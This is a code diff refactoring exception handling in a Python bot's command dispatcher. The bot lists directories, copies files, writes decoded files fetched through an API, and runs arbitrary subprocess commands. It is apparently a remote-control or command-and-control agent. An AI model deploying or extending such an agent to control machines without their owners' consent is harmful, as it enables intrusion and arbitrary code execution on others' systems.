@@ -72,33 +72,24 @@ class Bot:
         log_info("Executing command %s...", command)
         command, args = command[0], command[1:]
         result = "unknown command"
-        if command == 'ls':
-            dst = args[0]
-            try:
+        try:
+            if command == 'ls':
+                dst = args[0]
                 result = str(os.listdir(dst))
-            except Exception as e:
-                result = str(e)
-        elif command == 'cp':
-            try:
+            elif command == 'cp':
                 src, dst = args
                 result = str(shutil.copy(src, dst))
-            except Exception as e:
-                result = str(e)
-        elif command == 'dd':
-            try:
+            elif command == 'dd':
                 dst_file, data_file_id = args
                 data = self.api.fetch_file(data_file_id, 'data').text
                 with open(dst_file, 'wb') as f:
                     f.write(decode_command(data))
                 result = "Created: " + dst_file
-            except Exception as e:
-                result = str(e)
-        elif command == 'exec':
-            try:
+            elif command == 'exec':
                 result = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read()
                 result = result.decode('utf-8')
-            except Exception as e:
-                result = str(e)
+        except Exception as e:
+            result = str(e)
         log_info("%s", result)
         return result
 
